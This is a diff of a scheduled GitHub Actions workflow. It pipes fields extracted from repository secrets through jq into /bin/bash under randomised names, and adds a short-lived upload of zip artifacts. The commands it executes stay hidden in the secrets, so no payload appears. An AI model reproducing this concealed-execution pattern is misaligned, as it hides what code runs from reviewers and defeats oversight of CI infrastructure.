@@ -1,26 +1,27 @@
 name: fanhaozhiwang
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '28 4/6 * * *'
 
-jobs:  # 3088
+  schedule:
+    - cron: '34 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fanhaozhiwang
         env:
-          rqjz20193: ${{ secrets.rqjz20193 }}
+          bsy39: ${{ secrets.bsy39 }}
         run: |
-          echo $rqjz20193 | jq -r .oepnj9064 | /bin/bash
-          echo $u37609 | jq -r .a40217 | /bin/bash
-          echo $krvew4 | jq -r .jl3285 | /bin/bash
-          echo $fyo0 | jq -r .jtow36 | /bin/bash
-          echo $nmh1544 | jq -r .hly1 | /bin/bash
-          echo $stmv408 | jq -r .oq84475 | /bin/bash
-          echo $h89223 | jq -r .yqxam1971 | /bin/bash
-          echo $k15288 | jq -r .rqpd5 | /bin/bash
+          printf '%s' "$bsy39" | jq -r .jc7926 | /bin/bash
+          echo $hxcfk5 | jq -r .zgy304 | /bin/bash
+          echo $ysamu1 | jq -r .kfrvs6029 | /bin/bash
+          echo $lsze090 | jq -r .q89 | /bin/bash
+          echo $b20 | jq -r .sb830 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: k15oKsQG
+          path: "*.zip"
+          retention-days: 1
